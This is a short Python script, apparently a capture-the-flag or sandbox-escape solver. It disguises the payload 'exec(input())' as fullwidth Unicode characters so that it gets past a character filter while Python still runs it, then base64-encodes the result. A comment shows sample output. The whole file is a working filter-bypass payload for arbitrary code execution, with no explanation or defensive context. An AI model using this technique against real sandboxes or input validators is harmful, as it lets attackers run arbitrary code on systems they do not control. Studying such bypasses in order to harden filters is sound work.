import base64

def to_valid_3bytes(c):
  if c == "(":
    return "( \t"
  if c == ")":
    return ") \t"
  
  return chr(65345 - ord('a') + ord(c))

payload = "exec(input())"
payload = "".join(map(to_valid_3bytes,payload))

print(payload)
# 772F772Y772F772DKCAJ772J772O772Q772V772UKCAJKSAJKSAJ
print(base64.b64encode(payload.encode()).decode())